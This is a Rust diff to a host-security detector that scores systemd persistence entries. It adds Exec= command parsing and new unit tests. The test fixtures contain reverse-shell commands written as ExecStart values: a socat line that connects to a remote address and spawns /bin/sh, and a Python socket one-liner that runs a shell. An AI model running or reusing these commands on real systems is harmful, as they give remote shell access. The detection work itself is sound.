@@ -152,10 +152,11 @@ fn assess_persistence_entry(event: &RawEvent) -> PersistenceEntryAssessment {
 }
 
 fn assess_persistence_line(line: &str) -> PersistenceEntryAssessment {
-    let lowered = line.to_ascii_lowercase();
+    let command = persistence_command_text(line);
+    let lowered = command.to_ascii_lowercase();
     let mut assessment = PersistenceEntryAssessment::default();
 
-    let network_assessment = assess_network_execution_command(line);
+    let network_assessment = assess_network_execution_command(command);
     if network_assessment.is_suspicious() {
         assessment.score = assessment.score.max(90);
         assessment.reasons.insert(network_assessment.reason_text());
@@ -193,6 +194,19 @@ fn assess_persistence_line(line: &str) -> PersistenceEntryAssessment {
     }
 
     assessment
+}
+
+fn persistence_command_text(line: &str) -> &str {
+    let trimmed = line.trim();
+    let Some((key, value)) = trimmed.split_once('=') else {
+        return trimmed;
+    };
+    let key = key.trim().to_ascii_lowercase();
+    if key.starts_with("exec") {
+        value.trim()
+    } else {
+        trimmed
+    }
 }
 
 fn contains_temp_payload_path(line: &str) -> bool {
@@ -255,7 +269,10 @@ fn diff_evidence(event: &RawEvent) -> Vec<sentinel_core::Evidence> {
 
 #[cfg(test)]
 mod tests {
-    use super::assess_persistence_line;
+    use super::{assess_persistence_line, PersistenceDetector};
+    use crate::detectors::{DetectContext, Detector};
+    use sentinel_core::{RawEvent, SentinelConfig};
+    use std::sync::Arc;
 
     #[test]
     fn persistence_risk_model_ignores_plain_shell_wrappers() {
@@ -285,5 +302,33 @@ mod tests {
             assess_persistence_line("ExecStart=socat TCP:203.0.113.10:4444 EXEC:/bin/sh,pty");
         assert!(assessment.is_suspicious(70));
         assert!(assessment.features.contains("network_execution_bridge"));
+    }
+
+    #[test]
+    fn persistence_risk_model_parses_systemd_exec_prefix() {
+        let assessment = assess_persistence_line(
+            "ExecStart=python3 -c 'import socket,os; s=socket.socket(); os.dup2(s.fileno(),0); os.system(\"/bin/sh\")'",
+        );
+        assert!(assessment.is_suspicious(70));
+        assert!(assessment.features.contains("network_execution_bridge"));
+    }
+
+    #[test]
+    fn detector_ignores_cloud_init_hotplug_shell_wrapper() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let event = RawEvent::new("persistence", "persistence_entry")
+            .with_field(
+                "path",
+                "/usr/lib/systemd/system/cloud-init-hotplugd.service",
+            )
+            .with_field("type", "systemd")
+            .with_field(
+                "suspicious_lines",
+                "ExecStart=/bin/bash -c 'read args <&3; echo \"args=$args\"; \\'",
+            );
+
+        let findings = PersistenceDetector.detect(&[event], &ctx);
+
+        assert!(findings.is_empty());
     }
 }
